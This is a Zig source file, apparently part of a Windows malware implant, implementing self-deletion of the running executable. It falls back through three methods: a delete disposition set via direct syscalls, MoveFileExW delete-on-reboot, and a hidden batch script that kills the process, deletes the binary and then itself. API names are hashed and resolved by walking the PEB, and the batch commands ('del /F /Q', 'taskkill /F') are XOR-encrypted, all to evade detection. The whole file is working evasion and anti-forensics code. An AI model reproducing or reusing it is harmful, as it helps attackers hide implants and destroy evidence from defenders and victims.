const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const B_PRE = hash.xorEncrypt("@echo off\r\n:loop\r\ndel /F /Q \"");
    pub const B_DEL_END = hash.xorEncrypt("\" >nul 2>&1\r\n");
    pub const B_TASKKILL = hash.xorEncrypt("taskkill /F /PID ");
    pub const B_TASKKILL_END = hash.xorEncrypt(" >nul 2>&1\r\n");
    pub const B_TIMEOUT = hash.xorEncrypt("timeout /t 2 /nobreak >nul 2>&1\r\n");
    pub const B_IF_EXIST = hash.xorEncrypt("if exist \"");
    pub const B_END = hash.xorEncrypt("\" goto loop\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n");
};

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

pub fn getExePath(allocator: std.mem.Allocator) ?[]u8 {
    const kernel32 = loadKernel32() orelse return null;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return null;
    const GetModuleFileNameW: *const fn (module: ?*const anyopaque, buffer: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(func));

    var us_buf: [4096]u16 = undefined;
    const len = GetModuleFileNameW(null, &us_buf, @as(u32, @intCast(us_buf.len)));
    if (len == 0) return null;

    var out = std.ArrayList(u8).init(allocator) catch return null;
    for (0..len) |i| {
        const cp = us_buf[i];
        if (cp < 0x80) {
            out.append(@as(u8, @intCast(cp))) catch {};
        }
    }
    return out.toOwnedSlice() catch null;
}

fn deleteLevel1(path: []const u8) bool {
    var us_buf: [1024]u16 = undefined;
    var i: usize = 0;
    while (i < path.len and i < us_buf.len) : (i += 1) us_buf[i] = path[i];
    us_buf[i] = 0;

    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };

    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;

    const status = engine.NtCreateFile(
        &handle,
        0x10000 | 0x00100000,
        @ptrCast(&oa),
        @ptrCast(&iosb),
        null,
        0,
        types.FILE_SHARE_READ | types.FILE_SHARE_WRITE | types.FILE_SHARE_DELETE,
        types.FILE_OPEN,
        0x00000020 | 0x00000040,
        null,
        0,
    );
    if (status < 0) return false;

    var fdi = types.FILE_DISPOSITION_INFORMATION{ .DeleteFile = 1 };
    const set_status = engine.NtSetInformationFile(
        handle,
        &iosb,
        @ptrCast(&fdi),
        @sizeOf(types.FILE_DISPOSITION_INFORMATION),
        @intFromEnum(types.FILE_INFORMATION_CLASS.FileDispositionInformation),
    );
    _ = engine.NtClose(handle);
    return set_status >= 0;
}

fn deleteLevel2(path: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("MoveFileExW")) orelse return false;
    const MoveFileExW: *const fn (existing: ?[*:0]const u16, new: ?[*:0]const u16, flags: u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(func));

    var us_buf: [1024]u16 = undefined;
    var i: usize = 0;
    while (i < path.len and i < us_buf.len) : (i += 1) us_buf[i] = path[i];
    us_buf[i] = 0;

    return MoveFileExW(us_buf[0 .. i + 1 :0], null, 4) != 0;
}

fn deleteLevel3(path: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetTempPathW")) orelse return false;
    const GetTempPathW: *const fn (len: u32, buf: [*]u16) callconv(.winapi) u32 = @ptrCast(@alignCast(func));

    const getpid = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetCurrentProcessId")) orelse return false;
    const GetCurrentProcessId: *const fn () callconv(.winapi) u32 = @ptrCast(@alignCast(getpid));

    var temp_buf: [512]u16 = undefined;
    const temp_len = GetTempPathW(512, &temp_buf);
    if (temp_len == 0) return false;

    const pid = GetCurrentProcessId();

    var batch_buf: [4096]u8 = undefined;
    var pos: usize = 0;

    var b_pre_buf: [E.B_PRE.len]u8 = undefined;
    hash.xorDecrypt(&E.B_PRE, &b_pre_buf);
    const b_pre = b_pre_buf[0..];
    @memcpy(batch_buf[pos..][0..b_pre.len], b_pre);
    pos += b_pre.len;

    @memcpy(batch_buf[pos..][0..path.len], path);
    pos += path.len;

    var b_del_end_buf: [E.B_DEL_END.len]u8 = undefined;
    hash.xorDecrypt(&E.B_DEL_END, &b_del_end_buf);
    const b_del_end = b_del_end_buf[0..];
    @memcpy(batch_buf[pos..][0..b_del_end.len], b_del_end);
    pos += b_del_end.len;

    var b_taskkill_buf: [E.B_TASKKILL.len]u8 = undefined;
    hash.xorDecrypt(&E.B_TASKKILL, &b_taskkill_buf);
    const b_taskkill = b_taskkill_buf[0..];
    @memcpy(batch_buf[pos..][0..b_taskkill.len], b_taskkill);
    pos += b_taskkill.len;

    const pid_str = std.fmt.formatIntBuf(batch_buf[pos..], pid, 10, .lower, .{});
    pos += pid_str;

    var b_taskkill_end_buf: [E.B_TASKKILL_END.len]u8 = undefined;
    hash.xorDecrypt(&E.B_TASKKILL_END, &b_taskkill_end_buf);
    const b_taskkill_end = b_taskkill_end_buf[0..];
    @memcpy(batch_buf[pos..][0..b_taskkill_end.len], b_taskkill_end);
    pos += b_taskkill_end.len;

    var b_timeout_buf: [E.B_TIMEOUT.len]u8 = undefined;
    hash.xorDecrypt(&E.B_TIMEOUT, &b_timeout_buf);
    const b_timeout = b_timeout_buf[0..];
    @memcpy(batch_buf[pos..][0..b_timeout.len], b_timeout);
    pos += b_timeout.len;

    var b_if_exist_buf: [E.B_IF_EXIST.len]u8 = undefined;
    hash.xorDecrypt(&E.B_IF_EXIST, &b_if_exist_buf);
    const b_if_exist = b_if_exist_buf[0..];
    @memcpy(batch_buf[pos..][0..b_if_exist.len], b_if_exist);
    pos += b_if_exist.len;

    @memcpy(batch_buf[pos..][0..path.len], path);
    pos += path.len;

    var b_end_buf: [E.B_END.len]u8 = undefined;
    hash.xorDecrypt(&E.B_END, &b_end_buf);
    const b_end = b_end_buf[0..];
    @memcpy(batch_buf[pos..][0..b_end.len], b_end);
    pos += b_end.len;

    var batch_us: [4096]u16 = undefined;
    for (0..pos) |j| batch_us[j] = batch_buf[j];
    batch_us[pos] = 0;

    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);

    const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));

    return CreateProcessW(null, @ptrCast(&batch_us), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0;
}

pub const SelfDeleteResult = enum(u32) {
    level1 = 1,
    level2 = 2,
    level3 = 3,
    failed = 0,
};

pub fn selfDelete(allocator: std.mem.Allocator) SelfDeleteResult {
    const exe_path = getExePath(allocator) orelse return .failed;
    defer allocator.free(exe_path);

    if (exe_path.len == 0 or exe_path.len > 1024) return .failed;

    if (deleteLevel1(exe_path)) return .level1;
    if (deleteLevel2(exe_path)) return .level2;
    if (deleteLevel3(exe_path)) return .level3;
    return .failed;
}

test "getExePath returns non-empty" {
    const path = getExePath(std.testing.allocator);
    defer if (path) |p| std.testing.allocator.free(p);
    try std.testing.expect(path != null);
    try std.testing.expect(path.?.len > 0);
}

test "selfDelete returns result without crashing" {
    _ = selfDelete(std.testing.allocator);
}
